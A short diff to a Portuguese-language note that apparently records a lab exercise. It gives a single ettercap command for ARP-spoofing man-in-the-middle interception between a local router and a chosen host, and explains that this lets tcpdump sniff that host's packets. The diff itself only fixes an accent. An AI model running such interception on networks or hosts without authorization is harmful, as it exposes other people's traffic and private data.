@@ -1,4 +1,4 @@
 Comando utilizado para interceptar packets entre o roteador e o host desejado:
 sudo ettercap -T -S -i wlp2s0 -o -M arp:remote /192.168.15.1// /192.168.15.7//
 
-Somente com esse comando é possivel usar o tcpdump para fazer sniff de packets de hosts que não são a local machine.
+Somente com esse comando e possivel usar o tcpdump para fazer sniff de packets de hosts que não são a local machine.
